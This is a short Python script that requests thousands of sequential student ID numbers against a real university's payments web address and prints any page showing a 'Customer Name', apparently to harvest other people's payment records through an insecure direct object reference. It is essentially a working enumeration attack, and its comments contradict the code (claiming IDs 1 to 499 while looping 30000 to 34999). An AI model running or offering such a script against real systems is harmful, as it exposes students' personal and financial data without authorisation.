import requests

# Example: your site shows details at ?id=123
base_url = "https://students.nsbm.ac.lk/payments/"

for umisid in range(30000, 35000):  # try customer IDs 1 to 499
    url = f"{base_url}{umisid}"  # Fixed typo here
    r = requests.get(url)
    if r.status_code == 200 and "Customer Name" in r.text:
        print(f"ID {umisid} -> {r.text[:200]}")  # show first 200